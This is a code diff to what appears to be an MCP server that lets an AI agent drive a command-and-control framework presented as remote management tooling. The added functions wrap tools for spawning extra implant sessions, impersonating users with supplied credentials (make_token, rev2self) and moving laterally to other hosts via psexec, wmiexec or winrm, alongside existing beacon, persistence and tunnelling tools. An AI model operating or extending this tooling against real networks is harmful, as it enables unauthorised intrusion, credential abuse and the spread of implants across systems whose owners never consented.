@@ -98,6 +98,11 @@ from rmm_tools import (
     tool_queue_pe_load,
     tool_queue_upload,
     tool_remove_persistence,
+    tool_spawn_session,
+    tool_make_token,
+    tool_rev2self,
+    tool_lateral_move,
+    tool_session_uid,
     tool_start_socks,
     tool_start_tun,
     tool_stop_persistent,
@@ -491,9 +496,10 @@ def deploy_agent_script(
     sleep_seconds: int = 60,
     jitter_percent: int = 30,
     http_proxy: str = "",
+    workspace_id: str = "",
 ) -> str:
     """Render a ready-to-run client_rmm.ps1 configured with the active beacon URL and secret; returns a portable artifact_ref for queue_upload."""
-    return tool_deploy_agent_script(_client(), session_id, sleep_seconds, jitter_percent, http_proxy)
+    return tool_deploy_agent_script(_client(), session_id, sleep_seconds, jitter_percent, http_proxy, workspace_id)
 
 
 @mcp.tool()
@@ -504,9 +510,10 @@ def build_go_agent(
     sleep_seconds: int = 60,
     jitter_percent: int = 30,
     http_proxy: str = "",
+    workspace_id: str = "",
 ) -> str:
     """Build the repository Go agent with the active connection settings embedded; returns the ZIP artifact_ref for queue_upload."""
-    return tool_build_go_agent(_client(), goos, goarch, session_id, sleep_seconds, jitter_percent, http_proxy)
+    return tool_build_go_agent(_client(), goos, goarch, session_id, sleep_seconds, jitter_percent, http_proxy, workspace_id)
 
 
 @mcp.tool()
@@ -525,6 +532,71 @@ def install_persistence(session_ref: str) -> str:
 def remove_persistence(session_ref: str) -> str:
     """Queue agent persistence removal (lab use only)."""
     return tool_remove_persistence(_client(), session_ref)
+
+
+@mcp.tool()
+@_offload_tool
+def spawn_session(
+    session_ref: str,
+    verify: bool = True,
+    spawn_timeout: float = 120,
+    register_timeout: float = 60,
+    verify_timeout: float = 120,
+) -> str:
+    """Spawn a detached second Go agent from a live Go session with a fresh session ID, then require registration and exact fresh probe responses. verify=False reports an unconfirmed request only."""
+    return tool_spawn_session(
+        _client(),
+        session_ref,
+        verify=verify,
+        spawn_timeout=spawn_timeout,
+        register_timeout=register_timeout,
+        verify_timeout=verify_timeout,
+    )
+
+
+@mcp.tool()
+@_offload_tool
+def make_token(session_ref: str, user: str, domain: str = "", password: str = "", timeout: float = 120) -> str:
+    """Create a runas /netonly style network identity on a Go agent session; never repeat the password in responses."""
+    return tool_make_token(_client(), session_ref, user, domain=domain, password=password, timeout=timeout)
+
+
+@mcp.tool()
+@_offload_tool
+def rev2self(session_ref: str, timeout: float = 120) -> str:
+    """Revert a Go agent session to its own network identity after make_token."""
+    return tool_rev2self(_client(), session_ref, timeout=timeout)
+
+
+@mcp.tool()
+@_offload_tool
+def lateral_move(
+    session_ref: str,
+    method: str,
+    host: str,
+    verify: bool = True,
+    exec_timeout: float = 300,
+    register_timeout: float = 60,
+    verify_timeout: float = 120,
+) -> str:
+    """Start a Go agent on another host through psexec, wmiexec, or winrm; waits for registration and verifies both sessions."""
+    return tool_lateral_move(
+        _client(),
+        session_ref,
+        method,
+        host,
+        verify=verify,
+        exec_timeout=exec_timeout,
+        register_timeout=register_timeout,
+        verify_timeout=verify_timeout,
+    )
+
+
+@mcp.tool()
+@_offload_tool
+def session_uid(session_ref: str, timeout: float = 120) -> str:
+    """Show the identity a Go agent runs under, plus any active make_token network identity."""
+    return tool_session_uid(_client(), session_ref, timeout=timeout)
 
 
 if __name__ == "__main__":
